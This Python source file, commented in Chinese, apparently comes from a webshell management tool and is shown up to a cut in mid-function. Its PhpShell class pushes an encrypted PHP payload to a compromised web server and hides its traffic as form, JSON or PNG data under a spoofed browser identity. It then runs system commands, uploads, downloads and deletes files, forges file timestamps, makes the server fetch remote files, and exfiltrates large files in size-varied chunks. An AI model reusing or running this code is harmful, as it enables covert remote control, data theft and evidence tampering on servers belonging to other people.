#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import datetime
import hashlib
import requests
import json
import time
import gzip
from typing import Optional, Dict, Union, Any, List


from ..encryptPayload import encryptPayload
from ..custom_request import CustomRequestBuilder
from .phpPayload import phpPayload

# 导入基类
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from ..base_shell import BaseShell
from ..ReqParameter import ReqParameter


class PhpShell(BaseShell):
    """PHP Webshell客户端"""
    def __init__(self, url: str, param_name: str, secret_key: str):
        """
        初始化PHP webshell客户端
        
        Args:
            url: webshell URL地址
            param_name: 参数名（通常是'pass'）
            secret_key: 密钥
        """
        super().__init__(url, param_name, secret_key)
        
        # 密钥处理 - 使用16字节密钥以匹配PHP端的&15操作  
        self.secret_key = hashlib.md5(secret_key.encode()).hexdigest()[:16]
        self.param_name = param_name
        print("使用的密钥: ", self.secret_key)
        self.secret_key_bytes = self.secret_key.encode('utf-8')
        
        self.encryptPayload = encryptPayload(self.secret_key_bytes)
        self.phpPayload = phpPayload()
        self.response_encrypt_type = 'xor_base64'
        self.request_format = 'form'
        self.request_format_file = None

        # Cookie配置 - 用于标记定位
        self.cookie_name = 'X-Request-ID'

        # 生成标识符用于响应验证 - 使用原始密钥
        self.pass_key = self.param_name + self.secret_key  # 使用原始密钥，与payload.php中的逻辑一致
        self.response_flag_left = hashlib.md5(self.pass_key.encode()).hexdigest()[:16]
        self.response_flag_right = hashlib.md5(self.pass_key.encode()).hexdigest()[16:]
        
        print(f"[DEBUG] 响应标识符计算:")
        print(f"[DEBUG] pass_key: {self.pass_key}")
        print(f"[DEBUG] 期望的响应标识符 左: {self.response_flag_left}")
        print(f"[DEBUG] 期望的响应标识符 右: {self.response_flag_right}")
        
        # 创建HTTP会话
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # 代理配置（可选）
        self.session.proxies = None
        self.session.verify = False  # 忽略SSL证书验证
        
        # 初始化状态
        self.is_initialized = False
        self.system_info = None
        
        # 超时设置
        self.timeout = 30

        # 自定义JSON类型响应模板
        self.json_template = None
     
    def parse_response_xor_base64(self, response_data: str) -> Optional[bytes]:
        """
        解码响应数据：使用Base64编码的标记定位后Base64解码和XOR解密
        支持纯Base64字符串和JSON格式的响应
        
        Args:
            response_data: 服务器响应的原始数据（Base64格式或JSON格式）
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的左右标记（Base64格式）
            left_marker_base64, right_marker_base64 = self._generate_marker(self.request_cookie, self.secret_key)
            
            # 尝试解析JSON格式（如果是JSON响应，自动查找包含标记的字段）
            if response_data.strip().startswith('{'):
                try:
                    response_json = json.loads(response_data)
                    # 如果是JSON格式，遍历所有字段值查找包含左标记的字段
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if isinstance(value, str) and left_marker_base64 in value:
                                response_data = value
                                print(f"[DEBUG] 检测到JSON响应，已从 '{key}' 字段提取加密数据")
                                break
                except json.JSONDecodeError:
                    # 不是有效的JSON，继续按纯字符串处理
                    pass
            
            # 查找Base64编码的左右标记位置（无等号版本）
            left_pos = response_data.find(left_marker_base64)
            right_pos = response_data.rfind(right_marker_base64)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的Base64标记 左: {left_marker_base64}, 右: {right_marker_base64}")
                print(f"[DEBUG] 响应数据: {response_data[:100]}...")
                return None
            
            # 提取中间的加密数据（Base64格式，无填充符）
            # Base64标记长度为11字符（8字节二进制 -> 12字符Base64 -> 去除等号后11字符）
            encrypted_data_base64 = response_data[left_pos + len(left_marker_base64):right_pos]
            
            # 重新添加必要的填充符（因为服务端去除了等号）
            missing_padding = (4 - len(encrypted_data_base64) % 4) % 4
            if missing_padding:
                encrypted_data_base64 += '=' * missing_padding
            
            # XOR解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptXorBase64(encrypted_data_base64)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None
        
 
    def parse_response_xor_raw(self, response_data: bytes) -> Optional[bytes]:
        """
        解码响应数据：使用二进制标记定位后XOR解密（xor_raw模式）
        
        Args:
            response_data: 服务器响应的原始二进制数据
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的二进制左右标记（使用 request_cookie，与服务端一致）
            left_marker, right_marker = self._generate_binary_marker(self.request_cookie, self.secret_key)
            
            # 查找左右标记的位置（二进制搜索）
            left_pos = response_data.find(left_marker)
            right_pos = response_data.rfind(right_marker)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的响应标记 左: {left_marker.hex()}, 右: {right_marker.hex()}")
                return None
            
            # 提取被标记包裹的加密数据（纯二进制，无Base64）
            # 二进制标记长度为8字节
            encrypted_data = response_data[left_pos + 8:right_pos]
            
            # XOR解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptXorRaw(encrypted_data)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            return None
    
    def parse_response_aes_base64(self, response_data: str) -> Optional[bytes]:
        """
        解码响应数据：使用Base64编码的标记定位后Base64解码和AES解密
        支持纯Base64字符串和JSON格式的响应
        
        Args:
            response_data: 服务器响应的原始数据（Base64格式或JSON格式）
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的左右标记（16进制格式）
            left_marker_hex, right_marker_hex = self._generate_marker(self.request_cookie, self.secret_key)
            
            # 将16进制标记转换为二进制，再Base64编码，并移除填充符（与服务端保持一致）
            left_marker_binary = bytes.fromhex(left_marker_hex)
            right_marker_binary = bytes.fromhex(right_marker_hex)
            left_marker_base64 = base64.b64encode(left_marker_binary).decode('utf-8').rstrip('=')
            right_marker_base64 = base64.b64encode(right_marker_binary).decode('utf-8').rstrip('=')
            
            # 尝试解析JSON格式（如果是JSON响应，自动查找包含标记的字段）
            if response_data.strip().startswith('{'):
                try:
                    response_json = json.loads(response_data)
                    # 如果是JSON格式，遍历所有字段值查找包含左标记的字段
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if isinstance(value, str) and left_marker_base64 in value:
                                response_data = value
                                print(f"[DEBUG] 检测到JSON响应，已从 '{key}' 字段提取加密数据")
                                break
                except json.JSONDecodeError:
                    # 不是有效的JSON，继续按纯字符串处理
                    pass
            
            # 查找Base64编码的左右标记位置（无等号版本）
            left_pos = response_data.find(left_marker_base64)
            right_pos = response_data.rfind(right_marker_base64)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的Base64标记 左: {left_marker_base64}, 右: {right_marker_base64}")
                print(f"[DEBUG] 响应数据: {response_data[:100]}...")
                return None
            
            # 提取中间的加密数据（Base64格式，无填充符）
            encrypted_data_base64 = response_data[left_pos + len(left_marker_base64):right_pos]
            
            # 重新添加必要的填充符（因为服务端去除了等号）
            missing_padding = (4 - len(encrypted_data_base64) % 4) % 4
            if missing_padding:
                encrypted_data_base64 += '=' * missing_padding
            
            # AES解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptAesBase64(encrypted_data_base64)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None

    def parse_response_aes_raw(self, response_data: bytes) -> Optional[bytes]:
        """
        解码响应数据：使用二进制标记定位后AES解密（aes_raw模式）
        
        Args:
            response_data: 服务器响应的原始二进制数据
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的二进制左右标记（使用 request_cookie，与服务端一致）
            left_marker, right_marker = self._generate_binary_marker(self.request_cookie, self.secret_key)
            
            # 查找左右标记的位置（二进制搜索）
            left_pos = response_data.find(left_marker)
            right_pos = response_data.rfind(right_marker)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的响应标记 左: {left_marker.hex()}, 右: {right_marker.hex()}")
                return None
            
            # 提取被标记包裹的加密数据（纯二进制）
            encrypted_data = response_data[left_pos + 8:right_pos]
            
            # AES解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptAesRaw(encrypted_data)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            return None
    
    def xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """
        简单的XOR加密，用于加密初始payload（第一阶段加载密钥）
        算法必须与 PHP 端的 encode 函数保持一致：$c = $K[$i+1&15];
        """
        encrypted = bytearray()
        for i in range(len(data)):
            # 与 PHP 的 encode 函数保持一致：使用 (i+1) & 15 作为密钥索引
            encrypted.append(data[i] ^ key[(i + 1) & 15])
        return bytes(encrypted)

    def send_http_request(self, encrypted_data, is_init_request=False) -> Optional[tuple]:
        """
        发送请求到webshell
        
        Args:
            encrypted_data: 加密的请求数据，可能包含左右标记
            isInitRequest: 是否是初始化请求
        Returns:
            返回response对象，失败返回None
        """
        try:
            request_data = encrypted_data

            # 初始化自定义请求构建器
            self.custom_request_builder = CustomRequestBuilder(
                secret_key=self.secret_key, 
                param_name=self.param_name,
                config_file=self.request_format_file
            )

            # 如果不是初始化请求，使用标记定位法
            if not is_init_request:      
                # 使用自定义请求构建器创建请求体
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data,
                    request_format=self.request_format
                )

            else:
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data,
                    request_format="form"
                )
            
            headers = self.session.headers.copy()
            headers['Content-Type'] = content_type
            self.session.cookies.set(self.cookie_name, self.request_cookie)
            response = self.session.post(
                self.url, 
                data=request_data, 
                timeout=self.timeout,
                allow_redirects=False,
                headers=headers
            )
            
            return response
            
        except requests.exceptions.Timeout:
            print("[ERROR] 请求超时")
            return None
        except requests.exceptions.ConnectionError:
            print("[ERROR] 连接失败")
            return None
        except Exception as e:
            print(f"[ERROR] 请求失败: {e}")
            return None
    
    def init_payload(self,payload_name="mainPayload_xor_base64") -> bool:
        """
        初始化阶段：发送payload.php内容到服务端，建立session
        
        Returns:
            bool: 初始化成功返回True，失败返回False
        """
        if self.is_initialized:
            return True
        
        try:
            response_template = self._load_request_format_config("response.json_template")
            if response_template is not None and not self.json_template:
                if isinstance(response_template, (dict, list)):
                    self.json_template = json.dumps(response_template)
                else:
                    self.json_template = str(response_template)
            self.request_cookie = self._generate_random_cookie(32)

            # 加密初始化payload
            payload_content = self.phpPayload.getPayload(payload_name,json_template=self.json_template,param_name=self.param_name,secret_key=self.secret_key,cookie_name=self.cookie_name)
            encrypted_data = base64.b64encode(self.xor_encrypt(payload_content.encode('utf-8'), self.request_cookie.encode('utf-8'))).decode('utf-8')

            print("[DEBUG] 使用 xor_base64 加密模式初始化payload")
             
            response = self.send_http_request(encrypted_data, is_init_request=True)
                    
            if response.status_code == 200:
                print("[DEBUG] Payload初始化请求发送成功")
                self.is_initialized = True
                return True
            else:
                print(f"[ERROR] 初始化失败，HTTP状态码: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[ERROR] 初始化payload失败: {e}")
            return False
    
    def include(self, code_name: Optional[str], bin_code: Optional[bytes]) -> Optional[bool]:
        """
        加载php payload到会话中

        Args:
            code_name: 类名
            bin_code: 类代码
            
        Returns:
            bool: 加载成功返回True，失败返回False
        """
        parameter = ReqParameter()
        parameter.add("codeName", code_name)
        parameter.add("binCode", bin_code)
        result_bytes = self.eval_func(None, "includeCode", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 发送{code_name}payload失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        print(f"[DEBUG] 发送{code_name}payload成功: {result_bytes.decode('utf-8', errors='ignore')}")
        return True

    def eval_func(self, class_name: Optional[str], method_name: str, parameter: ReqParameter) -> Optional[bytes]:
        """
        调用服务端函数的通用方法
        
        Args:
            class_name: 类名（可选）
            method_name: 方法名
            parameter: 参数对象
            
        Returns:
            函数执行结果，失败返回None
        """
        
        # 添加必要的调用参数
        if class_name:
            parameter.add("codeName", class_name)
        parameter.add("methodName", method_name)
        
        # 格式化参数（未加密）
        formatted_params = parameter.format()

        # 生成请求cookie,用于生成请求标记
        self.request_cookie = self._generate_random_cookie(32)

  
        # 根据请求格式处理加密数据
        if self.request_format == "plain" or self.request_format == "xml" or self.request_format == "json":
            # 进行加密+Base64编码
            if "xor" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
            elif "aes" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptAesBase64(formatted_params).rstrip('=')
            else:
                encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
            req_left_marker, req_right_marker = self._generate_marker(self.request_cookie + "mark",self.secret_key)
            marked_encrypted_data = req_left_marker + encrypted_data + req_right_marker
        elif self.request_format == "png" or self.request_format == "plain_binary":
            # 进行加密（返回原始bytes）
            if "xor" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptXorRaw(formatted_params)
            elif "aes" in self.response_encrypt_type:
                encrypted_data = self.encryptPayload.encryptAesRaw(formatted_params)
            else:
                encrypted_data = self.encryptPayload.encryptXorRaw(formatted_params)
            req_left_marker, req_right_marker = self._generate_binary_marker(self.request_cookie + "mark",self.secret_key)
            marked_encrypted_data = req_left_marker + encrypted_data + req_right_marker
        else:
            # form格式使用加密+Base64编码
            if "xor" in self.response_encrypt_type:
                marked_encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
            elif "aes" in self.response_encrypt_type:
                marked_encrypted_data = self.encryptPayload.encryptAesBase64(formatted_params).rstrip('=')
            else:
                marked_encrypted_data = self.encryptPayload.encryptXorBase64(formatted_params).rstrip('=')
        
        # 发送请求（非初始化请求，会使用标记定位法）
        # 发送HTTP请求（带重试逻辑）
        max_retries = 3
        for retry_count in range(max_retries + 1):
            response = self.send_http_request(marked_encrypted_data, is_init_request=False)
            
            # 如果返回None，表示遇到500错误，需要重新初始化
            if response.status_code == 500:
                if retry_count < max_retries:
                    print(f"[DEBUG] 第{retry_count + 1}次重试：重新初始化payload")
                    try:
                        # 重新初始化payload（使用原有的class_name和webshell_id）
                        class_name_pattern = f"mainPayload_{self.response_encrypt_type}"
                        self.init_payload(class_name=class_name_pattern)
                        continue  # 继续下一次重试
                    except Exception as init_error:
                        print(f"[DEBUG] 重新初始化失败: {init_error}")
                        continue
                else:
                    print(f"[DEBUG] 重试{max_retries}次后仍然失败，放弃")
                    return b"ERROR: Maximum retries exceeded"
            else:
                # 请求成功，跳出重试循环
                break
        else:
            # 如果循环正常结束（没有break），说明所有重试都失败了
            return b"ERROR: All retries failed"
        

        if response.status_code == 200 and response.content:
            if "xor_base64" in self.response_encrypt_type:
                return self.parse_response_xor_base64(response.content.decode('utf-8', errors='ignore'))
            elif "xor_raw" in self.response_encrypt_type:
                # xor_raw 模式直接传递二进制数据，不解码
                return self.parse_response_xor_raw(response.content)
            elif "aes_base64" in self.response_encrypt_type:
                return self.parse_response_aes_base64(response.content.decode('utf-8', errors='ignore'))
            elif "aes_raw" in self.response_encrypt_type:
                # aes_raw 模式直接传递二进制数据，不解码
                return self.parse_response_aes_raw(response.content)
            else:
                return self.parse_response_xor_base64(response.content.decode('utf-8', errors='ignore'))
        else:
            print(f"[ERROR] HTTP响应失败，状态码: {response.status_code}")
            return None
    
 
    def get_basic_info(self) -> Optional[Dict[str, str]]:
        """
        获取系统基本信息
        
        Returns:
            dict: 包含系统信息的字典
            None: 获取失败时返回None
        """
        try:
            # 创建参数对象
            parameter = ReqParameter()
            
            # 调用getBasicsInfo函数
            result_bytes = self.eval_func(None, "getBasicsInfo", parameter)
            
            if result_bytes is None:
                print("[ERROR] 获取系统信息失败")
                return None
            
            # 解析结果
            result_text = result_bytes.decode('utf-8', errors='ignore')
            print("[Debug] 执行命令结果：",result_text)
            
            if not result_text:
                print("[ERROR] 系统信息为空")
                return None
            
            # 解析键值对格式的结果
            info_dict = {}
            for line in result_text.strip().split('\n'):
                if ':' in line:
                    key, value = line.split(':', 1)
                    info_dict[key.strip()] = value.strip()
            
            self.system_info = info_dict
            return info_dict
            
        except Exception as e:
            print(f"[ERROR] 获取系统信息异常: {e}")
            return None
    
    def test(self) -> bool:
        """
        测试webshell连接是否正常
        
        Returns:
            bool: True表示连接正常，False表示连接失败
        """
        try:
            # 创建参数对象
            parameter = ReqParameter()
            result_bytes = self.eval_func(None, "test", parameter)

            if result_bytes is None:
                print("[ERROR] 连接测试失败")
                return False
            if result_bytes == b"ok":
                return True
            else:
                return False   
        except Exception as e:
            print(f"[ERROR] 连接测试异常: {e}")
            return False
                 
    def execute_command(self, command: str) -> Optional[str]:
        """
        执行系统命令
        
        Args:
            command: 要执行的命令字符串
            
        Returns:
            str: 命令执行结果
            None: 执行失败时返回None
        """
        try:
            parameter = ReqParameter()
            parameter.add("cmdLine", command)
            
            result_bytes = self.eval_func(None, "execCommand", parameter)
            
            if result_bytes is None:
                print("[ERROR] execute_command执行命令失败")
                return None
            
            result_text = result_bytes.decode('utf-8', errors='ignore')
            
            if result_text:
                print("[Debug] execute_command执行命令结果：", result_text[:200])  # 只打印前200个字符
            
            return result_text
            
        except Exception as e:
            print(f"[ERROR] execute_command执行命令异常: {e}")
            import traceback
            traceback.print_exc()
            return None

    def get_CurrentDir(self):
        """获取当前目录"""
        current_dir = self.system_info.get("CurrentDir").replace("\\", "/")
        if current_dir:
            return current_dir
        else:
            return None
    
    def get_files(self, path: Optional[str] = None) -> Optional[str]:
        """
        获取指定目录下的文件列表
        
        Args:
            path: 目录路径，如果为None则使用当前目录
            
        Returns:
            str: 文件列表字符串（格式：ok\n路径\n文件信息...）
            None: 获取失败时返回None
        """
        try:
            parameter = ReqParameter()
            if path:
                parameter.add("dirName", path)
            else:
                parameter.add("dirName", self.get_CurrentDir())
            
            result_bytes = self.eval_func(None, "getFile", parameter)  
            result_text = result_bytes.decode('utf-8', errors='ignore')
            if "ok" not in result_text:
                print(f"[DEBUG] 获取文件列表失败: {result_text}")
                return None
            print(f"[DEBUG] 获取文件列表成功: {result_text}")
            return result_text.split("ok")[1]
            
        except Exception as e:
            print(f"[ERROR] 获取文件列表异常: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def upload_file(self, file_path: str, file_data: bytes) -> bool:
        """
        上传文件到服务器
        
        Args:
            file_path: 目标文件路径
            file_data: 文件内容（字节）
            
        Returns:
            bool: 上传成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            parameter.add("fileValue", file_data.decode('utf-8', errors='ignore') if isinstance(file_data, bytes) else file_data)
            
            result_bytes = self.eval_func(None, "uploadFile", parameter)
            
            if result_bytes is None:
                print("[ERROR] 上传文件失败")
                return False
            
            result_text = result_bytes.decode('utf-8', errors='ignore').strip()
            return result_text == "ok"
            
        except Exception as e:
            print(f"[ERROR] 上传文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def download_file(self, file_path: str) -> Optional[Union[str, bytes]]:
        """
        从服务器下载文件
        
        Args:
            file_path: 文件路径
            
        Returns:
            bytes: 文件内容
            None: 下载失败时返回None
        """
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            
            result_bytes = self.eval_func(None, "readFileContent", parameter)
            
            if result_bytes is None:
                print("[ERROR] 下载文件失败")
                return None
            
            return result_bytes
            
        except Exception as e:
            print(f"[ERROR] 下载文件异常: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def delete_file(self, file_path: str) -> bool:
        """
        删除文件或目录
        
        Args:
            file_path: 文件或目录路径
            
        Returns:
            bool: 删除成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            
            result_bytes = self.eval_func(None, "deleteFile", parameter)
            
            if result_bytes is None:
                print("[ERROR] 删除文件失败")
                return False
            
            result_text = result_bytes.decode('utf-8', errors='ignore').strip()
            return result_text == "ok"
            
        except Exception as e:
            print(f"[ERROR] 删除文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def new_file(self, file_path: str) -> bool:
        """
        创建新文件
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 创建成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            
            result_bytes = self.eval_func(None, "newFile", parameter)
            
            if result_bytes is None:
                print("[ERROR] 创建文件失败")
                return False
            
            result_text = result_bytes.decode('utf-8', errors='ignore').strip()
            return result_text == "ok"
            
        except Exception as e:
            print(f"[ERROR] 创建文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def new_dir(self, dir_path: str) -> bool:
        """
        创建新目录
        
        Args:
            dir_path: 目录路径
            
        Returns:
            bool: 创建成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("dirName", dir_path)
            
            result_bytes = self.eval_func(None, "newDir", parameter)
            
            if result_bytes is None:
                print("[ERROR] 创建目录失败")
                return False
            
            result_text = result_bytes.decode('utf-8', errors='ignore').strip()
            return result_text == "ok"
            
        except Exception as e:
            print(f"[ERROR] 创建目录异常: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def copy_file(self, src_path: str, dest_path: str) -> bool:
        """
        复制文件
        
        Args:
            src_path: 源文件路径
            dest_path: 目标文件路径
            
        Returns:
            bool: 复制成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("srcFileName", src_path)
            parameter.add("destFileName", dest_path)
            
            result_bytes = self.eval_func(None, "copyFile", parameter)
            
            if result_bytes is None:
                print("[ERROR] 复制文件失败")
                return False
            
            result_text = result_bytes.decode('utf-8', errors='ignore').strip()
            return result_text == "ok"
            
        except Exception as e:
            print(f"[ERROR] 复制文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def move_file(self, src_path: str, dest_path: str) -> bool:
        """
        移动或重命名文件
        
        Args:
            src_path: 源文件路径
            dest_path: 目标文件路径
            
        Returns:
            bool: 移动成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("srcFileName", src_path)
            parameter.add("destFileName", dest_path)
            
            result_bytes = self.eval_func(None, "moveFile", parameter)
            
            if result_bytes is None:
                print("[ERROR] 移动文件失败")
                return False
            
            result_text = result_bytes.decode('utf-8', errors='ignore').strip()
            return result_text == "ok"
            
        except Exception as e:
            print(f"[ERROR] 移动文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False
     
    def set_file_time(self, file_path: str, time_list: List[str]) -> bool:
        """
        设置文件时间属性
        :param fileName: 文件路径
        :param time: 时间列表：[修改时间, 访问时间]，使用"none"表示不修改该属性
        :return: 操作结果
        """
        parameter = ReqParameter()
        
        # 只接受列表参数
        if not isinstance(time_list, (list, tuple)):
            raise ValueError("time_list 参数必须是列表：[修改时间, 访问时间]")
        
        if len(time_list) != 2:
            raise ValueError("时间列表必须包含2个元素：[修改时间, 访问时间]")
        
        time_parts = []
        for t in time_list:
            if t is None or t == "none" or str(t).lower() == "none":
                time_parts.append("none")
            else:
                # 转换时间字符串为时间戳
                dt_object = datetime.datetime.strptime(str(t), "%Y-%m-%d %H:%M:%S")
                sec_timestamp = dt_object.timestamp()
                sec_timestamp_str = str(int(sec_timestamp))
                time_parts.append(sec_timestamp_str)
        
        # 用 "|" 连接时间戳
        time_attr = "|".join(time_parts)

        parameter.add("fileName", file_path)
        parameter.add("attr", time_attr)
        parameter.add("type", "fileTimeAttr")
        result_bytes = self.eval_func(None, "setFileAttr", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 设置文件时间失败: {result_text}")
            return False
        print(f"[DEBUG] 设置文件时间成功: {result_text}")
        return True

    def set_file_permission(self, file_path: str, permission: str) -> bool:
        """
        设置文件权限
        """
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            parameter.add("attr", permission)
            parameter.add("type", "fileBasicAttr")
            result_bytes = self.eval_func(None, "setFileAttr", parameter)
            return result_bytes.decode('utf-8', errors='ignore').strip() == "ok"
        except Exception as e:
            print(f"[ERROR] 设置文件权限异常: {e}")
            import traceback
            traceback.print_exc()
            return False

    def file_remote_download(self, url: str, save_file: str) -> bool:
        """
        从远程URL下载文件并保存到本地
        
        Args:
            url: 远程文件URL
            save_file: 保存路径
            
        Returns:
            bool: 下载成功返回True，失败返回False
        """
        try:
            parameter = ReqParameter()
            parameter.add("url", url)
            parameter.add("saveFile", save_file)
            
            result_bytes = self.eval_func(None, "fileRemoteDown", parameter)
            
            if result_bytes is None:
                print("[ERROR] 远程下载文件失败")
                return False
            
            result_text = result_bytes.decode('utf-8', errors='ignore').strip()
            return result_text == "ok"
            
        except Exception as e:
            print(f"[ERROR] 远程下载文件异常: {e}")
            import traceback
            traceback.print_exc()
            return False

    def get_file_size(self, file_path: str) -> int:
        """
        获取文件大小
        """
        try:
            parameter = ReqParameter()
            parameter.add("fileName", file_path)
            result_bytes = self.eval_func(None, "getFileSize", parameter)
            return int(result_bytes.decode('utf-8', errors='ignore').strip())
        except Exception as e:
            print(f"[ERROR] 获取文件大小异常: {e}")

    def read_file_by_position(self, file_path: str, position: int, read_byte_num: int) -> bytes:
        """
        读取文件指定位置和长度的数据块
        """
        """按位置读取文件数据块"""
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("position", str(position))
        parameter.add("readByteNum", str(read_byte_num))
        result_bytes = self.eval_func(None, "readFileByPosition", parameter)
        print(f"[DEBUG] 读取文件块: {file_path} 位置: {position} 大小: {read_byte_num} 结果长度: {len(result_bytes)}")
        return result_bytes

    def big_file_download(self, file_path: str, save_path: Optional[str] = None, chunk_kb_size: Optional[int] = None, timeout: float = 0, enable_chunk_size_variation: bool = False, chunk_size_variation_kb: int = 128) -> bool:
        """
        大文件下载实现
        
        Args:
            filename: 服务器上要下载的文件路径
            save_path: 本地保存路径，如果为None则使用原文件名
            chunk_kb_size: 以kb为单位，每次读取的块大小，如果为None则动态计算
            timeout: 每次读取块之间的延迟时间，单位为秒，默认0秒
            enable_chunk_size_variation: 是否启用块大小浮动，默认False
            chunk_size_variation_kb: 块大小浮动范围（KB），默认128KB
        
        Returns:
            bool: 下载是否成功
        """
        try:
            print(f"[INFO] 开始下载大文件: {file_path}")
            
            # 1. 获取文件大小
            file_size = self.get_file_size(file_path)
            if file_size is None:
                print(f"[ERROR] 无法获取文件大小")
                return False
            
            print(f"[INFO] 文件大小: {file_size} 字节")
            
            # 2. 如果未提供块大小，则根据文件大小动态设置
            if chunk_kb_size is None:
                if file_size < 1 * 1024 * 1024:  # < 1MB
                    chunk_kb_size = 64  # 64KB chunks
                elif file_size < 100 * 1024 * 1024: # < 100MB
                    chunk_kb_size = 512 # 512KB chunks
                else: # >= 100MB
                    chunk_kb_size = 1024 * 4 # 4MB chunks
                print(f"[INFO] 未指定块大小，根据文件大小自动设置为: {chunk_kb_size} KB")

            # 3. 确定保存路径和初始化变量
            if save_path is None:
                import os
                save_path = os.path.basename(file_path)
            
            base_chunk_size = chunk_kb_size * 1024
            
            # 打印块浮动配置信息
            if enable_chunk_size_variation:
                variation_bytes = chunk_size_variation_kb * 1024
                min_chunk_size = max(1024, base_chunk_size - variation_bytes)  # 最小1KB
                max_chunk_size = base_chunk_size + variation_bytes
                print(f"[INFO] 启用块大小浮动: 基础块大小 {chunk_kb_size}KB, 浮动范围 ±{chunk_size_variation_kb}KB")
                print(f"[INFO] 实际块大小范围: {min_chunk_size//1024}KB - {max_chunk_size//1024}KB")
            else:
                print(f"[INFO] 固定块大小: {chunk_kb_size}KB")
            
            # 4. 分块下载
            downloaded_data = b""
            position = 0
            chunk_index = 0
            
            while position < file_size:
                chunk_index += 1
                
                # 计算当前块的大小
                if enable_chunk_size_variation:
                    # 生成随机浮动的块大小
                    import random
